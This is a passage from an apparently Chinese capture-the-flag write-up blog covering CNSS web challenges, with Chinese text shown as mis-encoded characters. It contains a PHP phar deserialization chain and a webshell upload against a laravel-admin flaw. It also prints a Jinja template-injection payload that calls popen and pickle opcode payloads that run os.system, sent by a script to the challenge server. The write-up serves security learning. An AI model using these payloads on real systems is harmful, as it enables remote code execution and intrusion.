&#125;</span><br><span class="hljs-comment">*/</span><br>&#125;<br><span class="hljs-variable">$cnss</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CNSS</span>();<br><span class="hljs-variable">$cn55</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CN55</span>();<br><span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$cn55</span>-&gt;params[<span class="hljs-string">&#x27;key&#x27;</span>]=<span class="hljs-string">&#x27;f1ag.php&#x27;</span>;<br><span class="hljs-variable">$cnss</span>-&gt;name = <span class="hljs-variable">$show</span>;<br><span class="hljs-variable">$show</span>-&gt;haha[<span class="hljs-string">&#x27;hehe&#x27;</span>]=<span class="hljs-variable">$cn55</span>;<br><span class="hljs-variable">$phartest</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">phar</span>(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<span class="hljs-comment">//åç¼€åå¿…é¡»ä¸ºphar</span><br><span class="hljs-variable">$phartest</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<span class="hljs-comment">//å¼€å§‹ç¼“å†² Phar å†™æ“ä½œ</span><br><span class="hljs-variable">$phartest</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$cnss</span>);<span class="hljs-comment">//è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span><br><span class="hljs-variable">$phartest</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="hljs-comment">//è®¾ç½®stubï¼Œstubæ˜¯ä¸€ä¸ªç®€å•çš„phpæ–‡ä»¶ã€‚PHPé€šè¿‡stubè¯†åˆ«ä¸€ä¸ªæ–‡ä»¶ä¸ºPHARæ–‡ä»¶ï¼Œå¯ä»¥åˆ©ç”¨è¿™ç‚¹ç»•è¿‡æ–‡ä»¶ä¸Šä¼ æ£€æµ‹</span><br><span class="hljs-variable">$phartest</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;payload.txt&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<span class="hljs-comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><br><span class="hljs-variable">$phartest</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<span class="hljs-comment">//åœæ­¢ç¼“å†²å¯¹ Phar å½’æ¡£çš„å†™å…¥è¯·æ±‚ï¼Œå¹¶å°†æ›´æ”¹ä¿å­˜åˆ°ç£ç›˜</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><em><strong>TODOï¼šå“­äº†ï¼Œå½“æ—¶çœ‹çš„å¥½ç»•ï¼Œä¸æ˜¯å¾ˆæ‡‚ï¼Œä»¥åå†æ¥çœ‹çœ‹</strong></em></p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;Y0u_Kn0w_PHP_v2ry_we11!!&#125;</code></font></center></strong></em></p><h2 id="Mid-ğŸš“-can-can-need-shell"><a href="#Mid-ğŸš“-can-can-need-shell" class="headerlink" title="[Mid] ğŸš“ can can need shell"></a>[Mid] ğŸš“ can can need shell</h2><p>æ ¹æ®hint:</p><p><a href="https://github.com/z-song/laravel-admin/issues/5764">https://github.com/z-song/laravel-admin/issues/5764</a></p><p>å¯ä»¥æ‰¾åˆ°åˆ«äººå¯¹æ¼æ´çš„å¤ç°:</p><p><a href="https://flyd.uk/post/cve-2023-24249/">https://flyd.uk/post/cve-2023-24249/</a></p><p>è®¿é—®adminç›®å½•ï¼Œ<em><strong>admin&#x2F;admin</strong></em>ç™»å½•</p><p>è¿™ä¸ªæ¼æ´æ˜¯<strong>ä»»æ„æ–‡ä»¶ä¸Šä¼ </strong></p><p>å…·ä½“æ–¹æ³•å¦‚ä¸‹ï¼š</p><p>æŠŠä¸€å¥è¯æœ¨é©¬å†™å…¥æ–‡ä»¶ï¼Œæ–‡ä»¶åç¼€æ”¹ä¸º<strong>jpg</strong></p><p>ä½¿ç”¨<strong>BurpSuite</strong>æŠ“åŒ…ï¼Œå…ˆä¸æ›´æ”¹ï¼Œç›´æ¥æ”¾è¡Œ</p><p>å†åˆ°httpå†å²è®°å½•ä¸­æ‰¾åˆ°postè®°å½•ï¼Œå¹¶å³é”®è¿›è¡Œé‡æ”¾</p><p><img src="/posts/43716/image-20231019011616135.png" alt="image-20231019011616135"></p><p>æ–‡ä»¶åç¼€æ”¹ä¸ºphpï¼Œå¹¶å‘é€</p><p><img src="/posts/43716/image-20231019011730708.png" alt="image-20231019011730708"></p><p>æ¼æ´å¤ç°æˆåŠŸå•¦ï¼Œä½†æ˜¯ä½ ä¼šå‘ç°æ€ä¹ˆè·Ÿä¸Šé¢æ–‡ç« ä¸ä¸€æ ·</p><p>å—¯ï¼Ÿä¸ºä»€ä¹ˆï¼Ÿç©¶ç«Ÿä¸ºä»€ä¹ˆï¼Ÿå•Šå•Šå•Šå•Šï¼Œç‰ç‰äº†</p><p>ç™¾æ€ä¸å¾—å…¶è§£ï¼Œä½†ç»è¿‡åæ¥ä¸€é€šä¹±ç‚¹å‘ç°äº†<del>æœºå¯†</del></p><p>æ˜¯å› ä¸ºåšäº†è¿‡æ»¤</p><p>ç‚¹å‡»<strong>Media manager</strong></p><p><img src="/posts/43716/image-20231019011953233.png" alt="image-20231019011953233"></p><p>ä¼šæœ‰ä¸€ä¸ª<strong>FilesystemAdapter.php</strong></p><p>ä¸‹è½½æ¥çœ‹çœ‹<img src="/posts/43716/image-20231019012323953.png" alt="image-20231019012323953"></p><p>å‘ç°å¯¹åç¼€ä»¥åŠå†…å®¹è¿›è¡Œäº†è¿‡æ»¤ï¼ŒçœŸæ˜¯å¤ª<strong>ç½ªæ¶</strong>äº†ğŸ˜¡</p><blockquote><p><em><strong>æ€ä¹ˆåŠï¼Œéš¾é“å°±è¦åœæ»ä¸å‰äº†å—</strong></em></p><p><em><strong>å˜¿ï¼Œä¸è¦å°çœ‹ç¾ç»Šçš„åŠ›é‡å•Šï¼ï¼</strong></em></p></blockquote><p>å¥½å§ï¼Œå…¶å®æ˜¯ç­‰äº†å‡ å¤©ï¼Œå‡ºé¢˜äººäº†åŠ äº†hint</p><blockquote><p>phpå…³é”®è¯åˆ—è¡¨:<br><a href="https://www.php.net/manual/zh/reserved.keywords.php">https://www.php.net/manual/zh/reserved.keywords.php</a><br>å‚è€ƒè¿™ä¸ª:<br><a href="https://www.php.net/manual/zh/function.include.php">https://www.php.net/manual/zh/function.include.php</a></p></blockquote><p>ä¸€çœ‹ï¼Œå¸ˆå‚…å¥½æ‰‹è‰ºï¼Œå¦™æ‰‹å›æ˜¥å•Šï¼Œå—æ•™äº†</p><p>wafæ²¡æœ‰è¿‡æ»¤<code>include</code>å’Œå¼•å·</p><p>é‚£å°±ä¸Šä¼ ä¸ªä¸€å¥è¯æœ¨é©¬txtï¼ˆèšå‰‘è¿ä¸ä¸Šï¼Œä¸é€ ä¸ºä»€ä¹ˆ</p><p>å†ç”¨includeåŒ…å«å®ƒï¼Œæ‰§è¡Œå°±å¥½äº†ï¼Œæ–¹æ³•è·Ÿä¸Šé¢ä¸€æ ·</p><p>ä¸€é€šæ“ä½œç›´æ¥å¾—åˆ°flag</p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;Y0U_H4cked_My_LaRaV31_4dM1n&#125;</code></font></center></strong></em></p><h2 id="Mid-ğŸ’»-CNSSå¨˜ã®èŠå¤©å®¤"><a href="#Mid-ğŸ’»-CNSSå¨˜ã®èŠå¤©å®¤" class="headerlink" title="[Mid] ğŸ’» CNSSå¨˜ã®èŠå¤©å®¤"></a>[Mid] ğŸ’» CNSSå¨˜ã®èŠå¤©å®¤</h2><p>è¿™é¢˜å¡æ­»æˆ‘äº†ï¼Œæœç´¢å¼•æ“å¿«è¢«æ©„æ¦„äº†å‘¢</p><p>ä¸€çœ¼sstiï¼Œä½†æ˜¯å±è”½äº†è‹±æ–‡å­—æ¯</p><p>å¥½å¥½å¥½ï¼Œä¸ä¼šï¼Œå¼€æœï¼Œç»è¿‡æ¼«é•¿çš„æœç´¢ï¼Œå‘ç°å¯ä»¥å…«è¿›åˆ¶ç»•è¿‡ï¼ˆğŸ¤®</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">//payload</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#123;</span>&#x27;&#x27;<span class="hljs-punctuation">[</span>&#x27;__class__&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;__bases__&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;__subclasses__&#x27;<span class="hljs-punctuation">]</span>()<span class="hljs-punctuation">[</span><span class="hljs-number">133</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;__init__&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;__globals__&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;popen&#x27;<span class="hljs-punctuation">]</span>(<span class="hljs-string">&quot;ls&quot;</span>)<span class="hljs-punctuation">[</span>&#x27;read&#x27;<span class="hljs-punctuation">]</span>()<span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span> <br><br><span class="hljs-comment">//è½¬æ¢ä¸º8è¿›åˆ¶</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#123;</span>&#x27;&#x27;<span class="hljs-punctuation">[</span>&#x27;\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>\<span class="hljs-number">143</span>\<span class="hljs-number">154</span>\<span class="hljs-number">141</span>\<span class="hljs-number">163</span>\<span class="hljs-number">163</span>\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>\<span class="hljs-number">142</span>\<span class="hljs-number">141</span>\<span class="hljs-number">163</span>\<span class="hljs-number">145</span>\<span class="hljs-number">163</span>\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>\<span class="hljs-number">163</span>\<span class="hljs-number">165</span>\<span class="hljs-number">142</span>\<span class="hljs-number">143</span>\<span class="hljs-number">154</span>\<span class="hljs-number">141</span>\<span class="hljs-number">163</span>\<span class="hljs-number">163</span>\<span class="hljs-number">145</span>\<span class="hljs-number">163</span>\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>&#x27;<span class="hljs-punctuation">]</span>()<span class="hljs-punctuation">[</span><span class="hljs-number">133</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>\<span class="hljs-number">151</span>\<span class="hljs-number">156</span>\<span class="hljs-number">151</span>\<span class="hljs-number">164</span>\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>\<span class="hljs-number">147</span>\<span class="hljs-number">154</span>\<span class="hljs-number">157</span>\<span class="hljs-number">142</span>\<span class="hljs-number">141</span>\<span class="hljs-number">154</span>\<span class="hljs-number">163</span>\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;\<span class="hljs-number">160</span>\<span class="hljs-number">157</span>\<span class="hljs-number">160</span>\<span class="hljs-number">145</span>\<span class="hljs-number">156</span>&#x27;<span class="hljs-punctuation">]</span>(<span class="hljs-string">&quot;\154\163&quot;</span>)<span class="hljs-punctuation">[</span>&#x27;\<span class="hljs-number">162</span>\<span class="hljs-number">145</span>\<span class="hljs-number">141</span>\<span class="hljs-number">144</span>&#x27;<span class="hljs-punctuation">]</span>()<span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span> <br></code></pre></td></tr></table></figure><p><img src="/posts/43716/image-20231019155400087.png" alt="image-20231019155400087"></p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;y0u_ru1n3d_my_ch4tr00m!&#125;</code></font></center></strong></em></p><h2 id="Mid-ğŸ›’-CNSSå¨˜ã®Flagå•†åº—"><a href="#Mid-ğŸ›’-CNSSå¨˜ã®Flagå•†åº—" class="headerlink" title="[Mid] ğŸ›’ CNSSå¨˜ã®Flagå•†åº—"></a>[Mid] ğŸ›’ CNSSå¨˜ã®Flagå•†åº—</h2><p>ï¼ˆå…¶å®æˆ‘è§‰å¾—è¿™ä¸ªæ‰åº”è¯¥æ˜¯Mid+</p><p><strong>&#x2F;code</strong>ä¸‹è½½æºç </p><p><em><strong>buyInfo.py</strong></em></p><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">NAME = <span class="hljs-string">&quot;Rich&quot;</span><br>MONEY = <span class="hljs-number">2000</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reset</span>():<br>    <span class="hljs-keyword">global</span> NAME, MONEY<br>    NAME = <span class="hljs-string">&quot;Rich&quot;</span><br>    MONEY = <span class="hljs-number">2000</span><br><br></code></pre></td></tr></table></figure></blockquote><p><em><strong>main.py</strong></em></p><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># encoding: utf-8</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">import</span> buyInfo<br><span class="hljs-keyword">import</span> flask<br><br>app = flask.Flask(__name__)<br>flag = os.environ.get(<span class="hljs-string">&#x27;FLAG&#x27;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Hi</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, money</span>):<br>        self.name = name<br>        self.money = money<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, other</span>):<br>        <span class="hljs-keyword">return</span> self.name == other.name <span class="hljs-keyword">and</span> self.money == other.money<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    user = flask.request.args.get(<span class="hljs-string">&#x27;user&#x27;</span>)<br>    <span class="hljs-keyword">if</span> user <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;View code in /code to buy flag.&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;R&#x27;</span> <span class="hljs-keyword">in</span> user.upper():<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;è‡­è¦é¥­çš„åˆ«æŒ¡æˆ‘è´¢è·¯&#x27;</span><br><br>    user = pickle.loads(user.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    <span class="hljs-built_in">print</span>(user.name, user.money)<br>    <span class="hljs-built_in">print</span>(buyInfo.NAME,  buyInfo.MONEY)<br>    <span class="hljs-keyword">if</span> user == Hi(buyInfo.NAME,  buyInfo.MONEY):<br>        buyInfo.reset()<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;CNSSå¨˜æœ€å–œæ¬¢å¯Œå“¥å•¦ï¼Œè¿™æ˜¯ä½ è¦çš„flag <span class="hljs-subst">&#123;flag&#125;</span>&#x27;</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;è‡­è¦é¥­çš„åˆ«æŒ¡æˆ‘è´¢è·¯&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/code&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">code</span>():<br>    file = <span class="hljs-string">&#x27;code.zip&#x27;</span><br>    <span class="hljs-keyword">return</span> flask.send_file(file, mimetype=<span class="hljs-string">&#x27;application/zip&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8888</span>)<br><br></code></pre></td></tr></table></figure></blockquote><p>æ ¹æ®æºç å¯çŸ¥è¦å¯¹**&#x2F;?user**è¿›è¡Œè¯·æ±‚</p><p>å¯¹<code>R</code>å‘½ä»¤è¿›è¡Œäº†è¿‡æ»¤ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜æœ‰iå’Œä»cæŒ‡ä»¤</p><p><strong>R:</strong></p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs opcocde">b&#x27;&#x27;&#x27;cos<br>system<br>(S&#x27;whoami&#x27;<br>tR.&#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure></blockquote><p><strong>i:</strong></p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs opcode">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;<br>ios<br>system<br>.&#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure></blockquote><p><strong>o:</strong></p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs opcode">b&#x27;&#x27;&#x27;(cos<br>system<br>S&#x27;whoami&#x27;<br>o.&#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure></blockquote><p>è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªå«<strong>opcode</strong>çš„ä¸œè¥¿</p><blockquote><p><em>æ‰¾åˆ°çš„èµ„æ–™ï¼š</em></p><p><a href="https://zhuanlan.zhihu.com/p/89132768">ä»é›¶å¼€å§‹pythonååºåˆ—åŒ–æ”»å‡»ï¼špickleåŸç†è§£æ &amp; ä¸ç”¨reduceçš„RCEå§¿åŠ¿ - çŸ¥ä¹ (zhihu.com)</a></p><p><a href="https://xz.aliyun.com/t/7436">pickleååºåˆ—åŒ–åˆæ¢ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p><a href="https://www.anquanke.com/post/id/188981%E6%89%BE%E5%88%B0">Python pickle ååºåˆ—åŒ–å®ä¾‹åˆ†æ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p></blockquote><p>ä¸€äº›ç‚¹ï¼š</p><ul><li><p>cæŒ‡ä»¤ä¼šè‡ªåŠ¨importåº“ï¼Œæ‰€ä»¥åœ¨æºä»£ç ä¸­ä¸éœ€è¦å¼•å…¥ç›¸å…³åº“</p></li><li><p>opcodeå¯ä»¥æ‰‹å†™ï¼Œä¹Ÿå¯ä»¥ç”¨**<code>pickle.dumps(,protocol=0)</code>**ç”Ÿæˆï¼Œä½†æ˜¯ä½¿ç”¨çš„pickleç‰ˆæœ¬ä¸èƒ½è¿‡é«˜ï¼Œå› ä¸ºé«˜ç‰ˆæœ¬æœ‰å¾ˆå¤šä¸å¯è§å­—ç¬¦ï¼Œä¸æ–¹ä¾¿ç¼–è¾‘ï¼ˆç”Ÿæˆçš„ä¸çŸ¥é“ä¸ºå•¥æˆ‘ç”¨äº†ï¼Œæ‰€ä»¥æˆ‘å¹²è„†æ‰‹å†™äº†</p></li><li><blockquote><p>å¯ä»¥ä½¿ç”¨<strong>pickletools</strong>æ¥è°ƒè¯•</p><p><strong>pickletools</strong>æ˜¯pythonè‡ªå¸¦çš„pickleè°ƒè¯•å™¨ï¼Œæœ‰ä¸‰ä¸ªåŠŸèƒ½ï¼š</p><ol><li><strong>åæ±‡ç¼–</strong>ä¸€ä¸ªå·²ç»è¢«æ‰“åŒ…çš„å­—ç¬¦ä¸²</li><li><strong>ä¼˜åŒ–</strong>ä¸€ä¸ªå·²ç»è¢«æ‰“åŒ…çš„å­—ç¬¦ä¸²</li><li><strong>è¿”å›</strong>ä¸€ä¸ªè¿­ä»£å™¨æ¥ä¾›ç¨‹åºä½¿ç”¨</li></ol><p>æˆ‘ä»¬ä¸€èˆ¬ä½¿ç”¨å‰ä¸¤ç§ã€‚è¯¦çœ‹èµ„æ–™1</p></blockquote></li></ul><p><strong>è„šæœ¬ï¼š</strong></p><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> buyInfo<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> urllib<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Hi</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, money</span>):<br>        self.name = name<br>        self.money = money<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, other</span>):<br>        <span class="hljs-keyword">return</span> self.name == other.name <span class="hljs-keyword">and</span> self.money == other.money<br><br><br>data = <span class="hljs-string">b&quot;&quot;&quot;c__main__</span><br><span class="hljs-string">buyInfo</span><br><span class="hljs-string">(c__main__</span><br><span class="hljs-string">Hi</span><br><span class="hljs-string">cbuyInfo</span><br><span class="hljs-string">NAME</span><br><span class="hljs-string">cbuyInfo</span><br><span class="hljs-string">MONEY</span><br><span class="hljs-string">o-.</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-built_in">print</span>(pickletools.dis(data))<br><span class="hljs-built_in">print</span>(pickle.loads(data).NAME, pickle.loads(data).MONEY)<br><br>url = <span class="hljs-string">f&quot;https://cnss-flag-shop-d22515ddfd9086fbb6b0c41c686a25c3.ctf.hurrison.com/?user=<span class="hljs-subst">&#123;data.decode()&#125;</span>&quot;</span><br>response = requests.request(<span class="hljs-string">&quot;GET&quot;</span>, url)<br><span class="hljs-built_in">print</span>(response.text)<br><br></code></pre></td></tr></table></figure></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs opcode">b&quot;&quot;&quot;c__main__<br>buyInfo<br>(c__main__<br>Hi<br>cbuyInfo<br>NAME<br>cbuyInfo<br>MONEY<br>o0.<br>&quot;&quot;&quot;<br></code></pre></td></tr></table></figure><p><img src="/posts/43716/image-20231019171808844.png" alt="image-20231019171808844"></p><p>è§£é‡Šä¸€ä¸‹è¿™ä¸€å¨</p><ol><li>æ‰‹å†™<code>c</code>æŒ‡ä»¤è·å¾—å…¨å±€å˜é‡<code>__main__.buyInfo</code></li><li><code>(</code>æ ‡è®°markå‹å…¥æ ˆ</li><li>å†ç”¨<code>c</code>æŒ‡ä»¤å¼•å…¥<code>__main__.Hi</code></li><li><code>c</code>å¼•å…¥<code>buyInfo.NAME</code>å’Œ<code>buyInfo.MONEY</code></li><li><code>o</code>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼ˆ3ï¼‰ï¼Œä»¥ä¹‹é—´çš„ç¬¬ä¸€ä¸ªæ•°æ®<code>__main__.Hi</code>ä¸ºcallableï¼Œç¬¬2ä¸ªåˆ°ç¬¬3ä¸ªæ•°æ®ä¸ºå‚æ•°ï¼Œæ‰§è¡Œè¯¥å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰</li><li><code>0</code>ä¸¢å¼ƒæ ˆï¼ˆå¯ä»¥ä¸å†™ï¼Œä½†æ˜¯ä¼šæŠ¥è­¦å‘Šï¼š<code>stack not empty after STOP</code>ï¼Œ<del>ä¹Ÿå¯ä»¥æ”¾åœ¨1å’Œ2ä¹‹é—´ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆ</del></li><li><code>.</code>ç»“æŸ</li></ol><table><thead><tr><th>opcode</th><th>æè¿°</th><th>å…·ä½“å†™æ³•</th><th>æ ˆä¸Šçš„å˜åŒ–</th><th>memoä¸Šçš„å˜åŒ–</th></tr></thead><tbody><tr><td>c</td><td>è·å–ä¸€ä¸ªå…¨å±€å¯¹è±¡æˆ–importä¸€ä¸ªæ¨¡å—ï¼ˆæ³¨ï¼šä¼šè°ƒç”¨importè¯­å¥ï¼Œèƒ½å¤Ÿå¼•å…¥æ–°çš„åŒ…ï¼‰</td><td>c[module]\n[instance]\n</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>o</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œä»¥ä¹‹é—´çš„ç¬¬ä¸€ä¸ªæ•°æ®ï¼ˆå¿…é¡»ä¸ºå‡½æ•°ï¼‰ä¸ºcallableï¼Œç¬¬äºŒä¸ªåˆ°ç¬¬nä¸ªæ•°æ®ä¸ºå‚æ•°ï¼Œæ‰§è¡Œè¯¥å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰</td><td>o</td><td>è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ•°æ®éƒ½å‡ºæ ˆï¼Œå‡½æ•°çš„è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„å¯¹è±¡ï¼‰å…¥æ ˆ</td><td>æ— </td></tr><tr><td>i</td><td>ç›¸å½“äºcå’Œoçš„ç»„åˆï¼Œå…ˆè·å–ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œç„¶åå¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ï¼Œä»¥è¯¥å…ƒç»„ä¸ºå‚æ•°æ‰§è¡Œå…¨å±€å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰</td><td>i[module]\n[callable]\n</td><td>è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ•°æ®éƒ½å‡ºæ ˆï¼Œå‡½æ•°è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„å¯¹è±¡ï¼‰å…¥æ ˆ</td><td>æ— </td></tr><tr><td>N</td><td>å®ä¾‹åŒ–ä¸€ä¸ªNone</td><td>N</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— 